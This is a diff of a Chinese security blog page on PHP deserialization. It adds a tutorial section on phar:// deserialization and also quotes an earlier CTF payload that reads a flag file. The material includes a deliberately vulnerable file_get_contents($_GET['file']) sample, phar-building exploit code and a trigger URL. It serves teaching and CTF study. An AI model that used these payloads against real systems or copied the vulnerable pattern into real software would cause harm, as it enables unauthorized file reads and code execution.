@@ -106,7 +106,9 @@
 <meta property="og:image" content="https://yml-sec.top/2019/07/14/反序列化相关问题注意点/10.png">
 <meta property="og:image" content="https://yml-sec.top/2019/07/14/反序列化相关问题注意点/11.png">
 <meta property="og:image" content="https://yml-sec.top/2019/07/14/反序列化相关问题注意点/12.png">
-<meta property="og:updated_time" content="2019-07-14T12:03:28.076Z">
+<meta property="og:image" content="https://yml-sec.top/2019/07/14/反序列化相关问题注意点/13.png">
+<meta property="og:image" content="https://yml-sec.top/2019/07/14/反序列化相关问题注意点/14.png">
+<meta property="og:updated_time" content="2019-07-15T00:41:00.133Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="反序列化相关问题注意点">
 <meta name="twitter:description" content="private与protected问题private当类内对象为private属性时，生成序列化字符串后会有一些不同，例如如下代码 1234567891011121314151617&amp;lt;?phpclass Student &amp;#123;    private $name = &apos;yemoli&apos;;    public $sex = &apos;man&apos;;    function __destruct() &amp;#">
@@ -343,7 +345,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  1.5k
+                  1.8k
                 </span>
               
 
@@ -359,7 +361,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  7
+                  8
                 </span>
               
             </div>
@@ -453,6 +455,21 @@
 <p>可以看到成功触发了反序列化，接着我们读取flag文件就好了</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"OowoO"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"mdzz"</span>;<span class="attribute">s</span>:<span class="number">90</span>:<span class="string">"var_dump(file_get_contents(dirname(__FILE__)."</span>/Here_1s_7he_fl4g_buT_You_Cannot_see.php<span class="string">"));"</span>;&#125;</span><br><span class="line">转义</span><br><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:5</span>:\"<span class="selector-tag">OowoO</span>\"<span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:\<span class="string">"mdzz\";s:90:\"var_dump(file_get_contents(dirname(__FILE__).\"/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";&#125;</span></span><br></pre></td></tr></table></figure>
 <p><img src="/2019/07/14/反序列化相关问题注意点/12.png" alt=""></p>
+<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><p>该方法在某些文件系统函数参数可控的情况下，与phar://伪协议配合使用可不使用unserialize()实现反序列化操作</p>
+<p>受影响的文件系统函数如下</p>
+<p><img src="/2019/07/14/反序列化相关问题注意点/13.png" alt=""></p>
+<p>(图片源于网络)</p>
+<p>有如下示例代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span> -&gt; mini;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'file'</span>];</span><br><span class="line">file_get_contents($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到并没有unserialize()函数，同时存在file_get_contents函数，我们可以利用phar来触发反序列化</p>
+<p>利用代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $o -&gt; mini=<span class="string">'yemoli'</span>;</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行代码后会生成一个phar.phar文件，生成的该文件后缀名可以随意更改，接下来使用phar://伪协议进行利用</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>/<span class="keyword">index</span>.php?<span class="keyword">file</span>=phar:<span class="comment">//phar.phar</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/14/反序列化相关问题注意点/14.png" alt=""></p>
+<p>可以看到成功的触发了反序列化。</p>
+<p>参考链接：</p>
+<p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener"></a></p>
 
       
     </div>
@@ -715,7 +732,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#private与protected问题"><span class="nav-number">1.</span> <span class="nav-text">private与protected问题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#private"><span class="nav-number">1.1.</span> <span class="nav-text">private</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#protected"><span class="nav-number">1.2.</span> <span class="nav-text">protected</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#wakeup-绕过"><span class="nav-number">2.</span> <span class="nav-text">__wakeup()绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#使用-绕过"><span class="nav-number">3.</span> <span class="nav-text">使用+绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#session的反序列化"><span class="nav-number">4.</span> <span class="nav-text">session的反序列化</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#private与protected问题"><span class="nav-number">1.</span> <span class="nav-text">private与protected问题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#private"><span class="nav-number">1.1.</span> <span class="nav-text">private</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#protected"><span class="nav-number">1.2.</span> <span class="nav-text">protected</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#wakeup-绕过"><span class="nav-number">2.</span> <span class="nav-text">__wakeup()绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#使用-绕过"><span class="nav-number">3.</span> <span class="nav-text">使用+绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#session的反序列化"><span class="nav-number">4.</span> <span class="nav-text">session的反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#phar反序列化"><span class="nav-number">5.</span> <span class="nav-text">phar反序列化</span></a></li></ol></div>
             
 
           </div>
@@ -759,7 +776,7 @@
 
 <div class="theme-info">
  <div class="powered-by"></div>
- <span class="post-count">博客全站共44.6k字</span>
+ <span class="post-count">博客全站共44.8k字</span>
 </div>
         
 
